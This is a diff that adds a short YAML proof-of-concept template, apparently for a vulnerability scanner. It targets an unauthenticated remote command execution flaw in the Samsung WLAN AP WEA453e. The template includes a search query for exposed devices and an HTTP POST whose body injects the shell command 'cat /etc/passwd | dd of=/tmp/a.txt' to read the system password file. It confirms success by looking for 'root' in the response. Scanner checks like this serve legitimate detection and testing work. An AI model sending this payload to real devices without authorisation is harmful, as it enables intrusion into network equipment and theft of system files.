@@ -1,0 +1,22 @@
+name: Samsung WLAN AP WEA453e RCE
+manual: true
+query: title=="Samsung WLAN AP"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /(download)/tmp/a.txt
+      headers:
+        Connection: close
+        Content-Length: "48"
+      body: command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: AndU
+  links:
+  - Internet
+  description: Samsung WLAN AP WEA453e router has a remote command execution vulnerability,
+    which can execute arbitrary commands without authorization to obtain server permissions
